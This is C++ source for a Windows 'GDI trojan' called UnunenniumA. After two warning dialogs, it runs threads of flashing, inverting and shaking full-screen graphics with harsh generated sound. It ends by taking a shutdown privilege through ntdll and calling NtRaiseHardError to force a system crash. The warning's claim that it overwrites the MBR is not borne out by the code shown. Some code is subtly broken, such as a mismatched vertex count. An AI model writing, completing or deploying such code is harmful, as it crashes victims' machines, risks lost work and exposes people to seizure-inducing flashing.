#include <windows.h> // the Windows API
#include <cmath> // trigonometry
#include <ctime> // time shit
#include <tchar.h>
#include <iostream>
#include <xmmintrin.h> // for the __rdtsc intrinsic
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#define NOTSRCINVERT 0x999999ul
#define HATCHPAINT 0x1900ac010eul
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);


COLORREF GetRandomRainbowSpectrum() {
	int color = rand () % 7;
	if (color == 0) {
		return RGB(255, 0, 0);
	}
	if (color == 1) {
		return RGB(255, 150, 0);
	}
	if (color == 2) {
		return RGB(255, 255, 0);
	}
	if (color == 3) {
		return RGB(0, 255, 0);
	}
	if (color == 4) {
		return RGB(0, 255, 255);
	}
	if (color == 5) {
		return RGB(0, 0, 255);
	}
	if (color == 6) {
		return RGB(255, 0, 255);
	}
}

VOID WINAPI SplitBlt(HDC hdc, int strength, int xSrc, int ySrc, DWORD dwSrcMode) {
	BitBlt(hdc, strength, strength, xSrc/2, ySrc/2, hdc, 0, 0, dwSrcMode);
	BitBlt(hdc, xSrc/2+1, strength, xSrc/2, ySrc/2, hdc, xSrc/2, 0, dwSrcMode);
	BitBlt(hdc, strength, ySrc/2+1, xSrc/2, ySrc/2, hdc, 0, ySrc/2, dwSrcMode);
	BitBlt(hdc, xSrc/2+1, ySrc/2+1, xSrc/2, ySrc/2, hdc, xSrc/2, ySrc/2, dwSrcMode);
} 


DWORD WINAPI Split1(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc;
	while (1) {
		hdc = GetDC(0);
		SplitBlt(hdc, -5, w, h, SRCPAINT); // example value
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}


int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

DWORD CALLBACK redrawCounter(LPVOID lprdw) {
	Sleep(500);
	InvalidateRect(NULL, 0, 0);
	return 0;
}

DWORD WINAPI SustainEpicPayload(LPVOID lpvoid)
	{
	CreateThread(NULL, 0, redrawCounter, NULL, 0, 0);
	HDC hdc;
	HBRUSH hbsh;
	while (true) {
		hdc = GetDC(0);
		hbsh = CreateSolidBrush(PALETTERGB(rand() % 239, rand() % 239, rand() % 239));
		StretchBlt(hdc, -5, -5, w+10, h+10, hdc, 0, 0, w, h, SRCINVERT);
		StretchBlt(hdc, 5, 5, w-10, h-10, hdc, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		SelectObject(hdc, hbsh);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}



	DWORD WINAPI SrcpaintDisp(LPVOID lpvoid)
	{
	HDC hdc;
	double dispangle = 0;
	while (true) {
		hdc = GetDC(0);
		for (FLOAT a = 0; a < w+h; a += 0.9f) {
			int v = cos(dispangle) * 3;
			BitBlt(hdc, 0, a, w, h, hdc, v, a, SRCAND);
			dispangle += M_PI / 5;
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI Bounce(LPVOID lpvoid)
	{
	HDC hdc;
	HPEN hp;
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (1) {
		hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		POINT opt[4] = {{360, y}, {x, y}, {50, 178}};
		hp = CreatePen(PS_SOLID, rand() % 5 + 10, GetRandomRainbowSpectrum());
		SelectObject(hdc, hp);
		PolyBezier(hdc, opt, 4);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		DeleteObject(hp);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI anglezoomer(LPVOID lpvd)
	{
	HDC hdc;
	while (true) {
		hdc = GetDC(0);
		StretchBlt(hdc, -10, -10, w+20, h+20, hdc, 0, 0, w-10, h-10, NOTSRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI gradienttriangle(LPVOID lpvd)
	{ // you must link the msimg32 library (or must you)
    HDC hdc = GetDC(0);
    while (1) {
        TRIVERTEX vtx[3];
        vtx[0].x = rand () % w; vtx[0].y = rand () % h;
        vtx[1].x = rand () % w; vtx[1].y = rand () % h;
        vtx[2].x = rand () % w; vtx[2].y = rand () % h;
        vtx[0].Red = 0xff00; vtx[0].Green = 0xff00; vtx[0].Blue = 0; vtx[0].Alpha = 0xff00;
        vtx[1].Red = 0; vtx[1].Green = 0xff00; vtx[1].Blue = 0xff00; vtx[1].Alpha = 0xff00;
        vtx[2].Red = 0xff00; vtx[2].Green = 20; vtx[2].Blue = 0xff00; vtx[2].Alpha = 0xff00;
        GRADIENT_TRIANGLE gt;
        gt.Vertex1 = 0;
        gt.Vertex2 = 1; gt.Vertex3 = 2;
        GradientFill(hdc, vtx, 4, &gt, 1, GRADIENT_FILL_TRIANGLE);
        Sleep(10);
    }
}

	DWORD WINAPI trigonshake(LPVOID lpvd)
	{
    HDC hdc;
    double angle = 0.0;
    int xadd, yadd; // x angle and y angle
    while (1) {
        hdc = GetDC(NULL);
        xadd = cos(angle) * 10, yadd = sin(angle) * 10;
        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, SRCAND);
        angle += M_PI / 8;
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI melt(LPVOID lpvoid)
	{
	HDC hdc;
	int rw;
	while (true) {
		hdc = GetDC(0);
		rw = rand() % w;
		int rh = rand() % h;
		BitBlt(hdc, rw, rand() % 20 - 10, 100, h, hdc, rw, 0, SRCAND);
		BitBlt(hdc, rand() % 20 - 10, rh, w, 100, hdc, 0, rh, SRCAND);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

	DWORD WINAPI setshake(LPVOID lpvoid)
	{
	HDC hdc;
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI patstatic(LPVOID lpvoid)
	{
	HDC hdc, mdc;
	HBRUSH hpat;
	while (true) {
		hdc = GetDC(0), mdc = CreateCompatibleDC(hdc);
		hpat = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		SetStretchBltMode(hdc, STRETCH_ORSCANS);
		SetStretchBltMode(mdc, STRETCH_ORSCANS);
		StretchBlt(mdc, 0, 0, w/10, h/10, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w/10, h/10, SRCCOPY);
		SelectObject(hdc, hpat);
		PatBlt(hdc, 0, 0, w, rand() % h, PATCOPY);
		DeleteObject(hpat);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}





void Sound1() {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 17000, 17000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[17000 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t^t*(t>>12))&18);

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

void Sound3() {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[17000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t^8|t^5)/0x144);

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

void Sound4() {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t^(t>>6)-t);

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

void Sound5() {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 22] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t^(t>>5|t>>8*t))%50);

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

void Sound6() {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 5] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*rand());

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}



int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"You are about to run the UnunenniumA.exe Trojan horse that will overwrite your MBR and make this device unusable.\r\nIf you are seeing this without knowing what you just executed, just hit No and nothing bad will happen.\r\nBut, if you\'re taking a risk, or running it in a safe environment, like a virtual machine, hit Yes.\r\n\r\nIf you are running this on physical hardware, shut it down and delete this file quickly!\r\nVenra is not responsible for any epilepsy made using this malware, reverse engineering it, or any artificial removal of this disclaimer!\r\nStill execute the malware?", L"GDI-Trojan.Win32.UnunenniumA - Malware Execution Alert", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"This is your final warning!\r\n\r\nThe creator of this malware is not responsible for any Epilepsy, as it was made for entertainment and scientific purposes only.\r\nShut this file down and delete it quickly, or hit Yes if you\'re running it on a VM.\r\nThis is your last chance.", L"GDI-Trojan.Win32.UnunenniumA - Final Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			Sleep(2000);
			HANDLE thread1 = CreateThread(0, 0, Split1, 0, 0, 0);
            Sound1();
			Sleep(15000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, SustainEpicPayload, 0, 0, 0);
           // Sound2();
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, SrcpaintDisp, 0, 0, 0);
           	HANDLE thread3dot1 = CreateThread(0, 0, Bounce, 0, 0, 0);
            HANDLE thread3dot2 = CreateThread(0, 0, anglezoomer, 0, 0, 0);
		    Sound3();
			Sleep(25000);
			TerminateThread(thread3, 0);
			TerminateThread(thread3dot2, 0);
			CloseHandle(thread3);
			CloseHandle(thread3dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, gradienttriangle, 0, 0, 0);
		    HANDLE thread4dot1 = CreateThread(0, 0, trigonshake, 0, 0, 0);
			Sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4);
			CloseHandle(thread4dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, melt, 0, 0, 0);
		    HANDLE thread5dot1 = CreateThread(0, 0, setshake, 0, 0, 0);
			Sound5();
			Sleep(22000);
			TerminateThread(thread5, 0);
			TerminateThread(thread5dot1, 0);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread5);
			CloseHandle(thread5dot1);
			CloseHandle(thread3dot1);
			InvalidateRect(0, 0, 0);
			HANDLE end = CreateThread(0, 0, patstatic, 0, 0, 0);
			Sound6();
			Sleep(5000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC00002AC, 0, 0, 0, 6, &response);
			Sleep(-1);
			
			
}}}
